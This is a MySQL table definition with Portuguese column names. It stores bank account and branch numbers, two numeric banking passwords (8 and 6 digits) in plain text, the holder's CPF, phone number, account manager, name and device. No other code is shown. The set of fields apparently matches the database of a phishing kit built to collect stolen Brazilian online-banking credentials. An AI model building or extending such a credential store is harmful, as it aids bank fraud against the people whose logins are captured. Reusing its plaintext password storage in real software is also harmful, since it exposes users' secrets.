CREATE TABLE `dados` (
  `id` INT NOT NULL AUTO_INCREMENT PRIMARY KEY, 
  `conta` VARCHAR(50) NOT NULL, 
  `agencia` VARCHAR(50) NOT NULL, 
  `senha8dig` VARCHAR(50) NOT NULL,
  `senha6dig` VARCHAR(50) NOT NULL,
  `cpf` VARCHAR(50) NOT NULL,
  `telefone` VARCHAR(50) NOT NULL,
  `gerente` VARCHAR(50) NOT NULL,
  `nome` VARCHAR(50) NOT NULL,
  `dispositivo` VARCHAR(50) NOT NULL
) ENGINE = InnoDB;